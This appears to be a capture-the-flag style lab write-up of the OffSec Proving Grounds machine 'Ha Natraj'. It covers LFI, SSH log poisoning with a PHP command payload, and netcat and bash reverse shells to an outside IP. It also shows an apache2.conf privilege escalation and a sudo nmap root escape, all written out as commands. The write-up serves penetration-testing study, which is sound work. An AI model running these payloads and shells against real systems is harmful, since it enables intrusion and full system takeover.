---
title: OffSec PG - Ha Natraj
date: 2021-12-19 12:00:00 +0500
categories: [Lab Practice Notes, OffSec Proving Grounds]
tags: [oscp,lab,offsec-proving-grounds]
image:
  path: /assets/img/covers/pg-cover.jpeg
  alt: PG Artwork
---

## Enumeration

Machine IP &rarr; `192.168.51.80`

### Network Scan

Nmap scan &rarr; `nmap -sC -sV -Pn -p- -A -o nmap.txt 192.168.51.80`

OS Detection &rarr;  `OS: Linux; CPE: cpe:/o:linux:linux_kernel`

### Table

| **Port** | **Service** | **Other details (if any)**                                   |
| -------- | ----------- | ------------------------------------------------------------ |
| 22       | SSH         | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) |
| 80       | HTTP        | Apache httpd 2.4.29 (Ubuntu)                                 |

### Web Scan

GoBuster scan &rarr; `gobuster dir -u http://192.168.51.80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php`

Directories/files listed &rarr;

- images/
- index.html
- console/

The `console/` directory has a php file present in it called `file.php`.

---

## Exploitation

### LFI

Running the `file.php` file does not give any output. As a good practice checking for LFI using `?file=../../../../../etc/passwd` works out and LFI is possible. There is an ssh service on the machine, therefore, checked log files. The auth log file at `/var/log/auth.log` contains the ssh logs.

### Transition LFI to SSH Log Poisoning

Given the presence of SSH logs, poisoning is tested by using payload &rarr; `ssh "<?php system(\$_GET['cmd']);?>"@<192.168.125.80>`. A failed login attempt gets logged and the php code is inserted. LFI can now be used to execute the php in the log file, with the addition of the `cmd` parameter like so &rarr; `..console/file.php?file=/var/log/auth.log&cmd=id`. This returned the id of the `www-data` user in the response i.e., RCE.

### User shell

Using the RCE, a shell can be spawned by using bash payload &rarr; `bash -i >& /dev/tcp/192.168.49.208/3002 0>&1` to get a reverse shell. This can be done via burp to URL encode and send the payload. There was no bash in the system, therefore reverting to nc and /bin/sh combo &rarr; `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.208 3002 >/tmp/f`.

This gives a `www-data` user shell via netcat.

---

## Privilege Escalation

### Escalated User

With the `www-data` shell, the linenum script can be run (example &rarr; [linenum script](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)). This gives the files which are writable by the current user. One such file is the `apache2.conf` file which can be modified to ensure execution of the web server as a privileged user by editing the User and Group to be `mahakal`, a user detected by looking at the `/etc/passwd` file.

Next, a pentest monkey php reverse shell is plugged into the serving directory for navigation to it. This can be named `exploit.php`. The server needs to be restarted for the new settings to be applied. Therefore, as revealed using `sudo -l`, the server can be restarted as super user without the need of a password using the systemctl command as the `www-data` user.

After it is restarted, a listener can be used to receive shell as the user `mahakal`.

### Root

As the user `mahakal`, the binary that can be run as as a super user without a password as revealed by `sudo -l` is actually `nmap`.

Nmap can be used to launch an interactive interpreter using &rarr;

```
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
nmap --script=$TF
```

Thus, the shell received is actually that of root. This gives the root flag.

---
